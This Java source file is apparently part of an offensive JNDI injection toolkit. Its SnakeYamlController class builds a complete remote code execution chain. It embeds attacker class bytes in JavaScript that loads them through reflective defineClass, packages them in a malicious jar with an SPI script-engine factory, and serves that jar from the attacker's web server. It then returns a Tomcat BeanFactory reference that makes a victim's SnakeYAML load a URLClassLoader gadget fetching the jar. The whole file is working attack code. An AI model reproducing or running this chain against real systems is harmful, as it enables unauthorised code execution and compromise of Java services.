package map.jndi.controller;

import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.bean.ClassBean;
import map.jndi.server.WebServer;
import map.jndi.template.ScriptEngineFactoryTemplate;
import map.jndi.util.JarUtil;
import map.jndi.util.MiscUtil;
import map.jndi.util.ReflectUtil;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;

@JNDIController
@JNDIMapping("/SnakeYaml")
public class SnakeYamlController extends BasicController {
    @Override
    public Object process(ClassBean classBean) {
        String factoryClassName = MiscUtil.getRandStr(12);
        String jarName = MiscUtil.getRandStr(12);

        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(classBean.getData()) + "');" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "method.setAccessible(true);" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
                "clazz.newInstance();";

        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"" + Main.codebase + jarName + ".jar" + "\"]\n" +
                "  ]]\n" +
                "]";

        byte[] jarBytes = null;

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(ScriptEngineFactoryTemplate.class.getName());
            clazz.replaceClassName(clazz.getName(), factoryClassName);
            ReflectUtil.setCtField(clazz, "code", CtField.Initializer.constant(code));

            jarBytes = JarUtil.createWithSPI(factoryClassName, clazz.toBytecode());
        } catch (Exception e) {
            e.printStackTrace();
        }

        WebServer.serveFile("/" + jarName + ".jar", jarBytes);

        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        return ref;
    }
}
